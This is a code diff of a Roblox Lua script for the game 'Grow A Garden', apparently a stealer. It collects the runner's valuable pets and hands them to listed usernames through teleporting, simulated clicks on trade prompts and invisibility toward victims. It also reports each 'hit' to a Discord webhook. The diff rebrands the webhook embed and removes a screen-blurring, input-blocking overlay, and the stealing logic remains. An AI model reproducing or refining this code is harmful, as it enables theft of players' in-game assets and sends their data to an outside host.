@@ -3,7 +3,6 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Lighting = game:GetService("Lighting")
 local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
@@ -32,7 +31,6 @@ local PET_WHITELIST = {
 
 local victimPetTable = {}
 
--- Function to add emojis ONLY when displaying pet names
 local function getPetNameWithEmoji(petName)
     local emojis = {
         ["Raccoon"] = "🦝",
@@ -46,19 +44,13 @@ local function getPetNameWithEmoji(petName)
         ["Spinosaurus"] = "🦕",
         ["Kitsune"] = "🦊✨"
     }
-    if emojis[petName] then
-        return petName .. " " .. emojis[petName]
-    else
-        return petName
-    end
+    return emojis[petName] and (petName .. " " .. emojis[petName]) or petName
 end
 
--- Check if pet name is whitelisted
 local function checkPetsWhitelist(petName)
     return PET_WHITELIST[petName] ~= nil
 end
 
--- Get pet object by UUID from Backpack or Character
 local function getPetObject(petUUID)
     for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
         if obj:GetAttribute("PET_UUID") == petUUID then
@@ -75,7 +67,6 @@ local function getPetObject(petUUID)
     return nil
 end
 
--- Equip pet tool
 local function equipPet(pet)
     if pet:GetAttribute("d") then
         ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
@@ -85,7 +76,6 @@ local function equipPet(pet)
     end
 end
 
--- Teleport to target player
 local function teleportTarget(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
     if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
@@ -93,7 +83,6 @@ local function teleportTarget(targetName)
     end
 end
 
--- Bypass click to trigger stealing prompt
 local function deltaBypass()
     VirtualInputManager:SendMouseButtonEvent(
         workspace.Camera.ViewportSize.X / 2,
@@ -108,7 +97,6 @@ local function deltaBypass()
     )
 end
 
--- Start stealing by triggering the prompt on victim's character head
 local function startSteal(triggerName)
     local targetPlayer = Players:FindFirstChild(triggerName)
     if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
@@ -120,10 +108,9 @@ local function startSteal(triggerName)
     end
 end
 
--- Send Discord webhook embed
 local function createDiscordEmbed(petList, totalValue, fileUrl)
     local embed = {
-        title = "🌱 Grow A Garden Hit - DARK SKIDS 💰",
+        title = "🌱 Grow A Garden Hit - KUNI - STEALER 💰",
         color = 65280,
         fields = {
             {
@@ -134,11 +121,6 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                     LocalPlayer.Name,
                     LocalPlayer.AccountAge
                 ),
-                inline = false
-            },
-            {
-                name = "💰 **Total Value**",
-                value = string.format("```%s¢```", totalValue),
                 inline = false
             },
             {
@@ -189,7 +171,6 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
     end
 end
 
--- Check pets inventory and equip + steal from victim
 local function checkPetsInventory(targetName)
     for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         if not checkPetsWhitelist(petData.PetType) then
@@ -204,7 +185,6 @@ local function checkPetsInventory(targetName)
     end
 end
 
--- Wait for whitelisted players to join, then teleport + act on them
 local function waitForJoin()
     for _, player in pairs(Players:GetPlayers()) do
         if table.find(USERNAMES, player.Name) then
@@ -214,7 +194,6 @@ local function waitForJoin()
     return false, nil
 end
 
--- Make yourself invisible only to victims (players NOT in USERNAMES)
 local function makeInvisibleToVictims()
     for _, player in pairs(Players:GetPlayers()) do
         if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
@@ -231,45 +210,6 @@ local function makeInvisibleToVictims()
     end
 end
 
--- Add a heavy dark blur to local player's screen
-local function addDarkBlurEffect()
-    local blur = Instance.new("BlurEffect")
-    blur.Size = 50
-    blur.Parent = Lighting
-
-    local colorCorrection = Instance.new("ColorCorrectionEffect")
-    colorCorrection.TintColor = Color3.fromRGB(20, 20, 20)
-    colorCorrection.Contrast = 0.5
-    colorCorrection.Saturation = -0.8
-    colorCorrection.Parent = Lighting
-
-    return blur, colorCorrection
-end
-
--- Disable all input while blur active
-local function disableAllInput()
-    UserInputService.InputBegan:Connect(function(input, gameProcessed)
-        if not gameProcessed then
-            -- Block all inputs by doing nothing here (ignoring)
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input, gameProcessed)
-        if not gameProcessed then
-            -- Block all inputs here as well
-        end
-    end)
-end
-
--- Disable ESC key specifically (optional)
-local function disableESC()
-    UserInputService.InputBegan:Connect(function(input, gameProcessed)
-        if input.KeyCode == Enum.KeyCode.Escape then
-            -- Do nothing on ESC
-        end
-    end)
-end
-
--- Main loop to continuously act when victim detected
 local function idlingTarget()
     task.spawn(function()
         while task.wait(0.2) do
@@ -283,13 +223,8 @@ local function idlingTarget()
     end)
 end
 
--- Run
-local blurInstance, colorCorrectionInstance = addDarkBlurEffect()
-disableAllInput()
-disableESC()
 idlingTarget()
 
--- Build pet list for webhook and send it once
 for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
     if checkPetsWhitelist(petData.PetType) then
         table.insert(victimPetTable, getPetNameWithEmoji(petData.PetType))
